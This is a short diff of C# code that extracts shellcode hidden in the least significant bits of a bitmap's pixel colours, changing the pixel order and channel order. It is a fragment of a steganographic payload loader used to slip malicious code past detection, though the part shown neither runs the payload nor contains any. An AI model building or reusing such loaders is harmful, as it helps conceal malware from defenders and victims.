@@ -23,28 +23,28 @@ namespace csharp
 
 
             int length = shellcode_len;
-
             int pos = 0;
-            for (int i = bm.Height - 1; i >= 0; i--)
+			
+            for (int i = 0; i < bm.Height; i++)
             {
                 for (int j = 0; j < bm.Width; j++)
                 {
                     Color pixel_color = bm.GetPixel(j, i);
 
-                    byte[] colors = { 
-                        pixel_color.B,
+                    byte[] channels = { 
+                        pixel_color.R,
                         pixel_color.G,
-                        pixel_color.R
+                        pixel_color.B
                     };
 
-                    foreach (byte color in colors)
+                    foreach (byte channel in channels)
                     {
                         if (length <= 0)
                         {
                             return;
                         }
 
-                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], color);
+                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channel);
                         pos++;
                         length--;
                     }
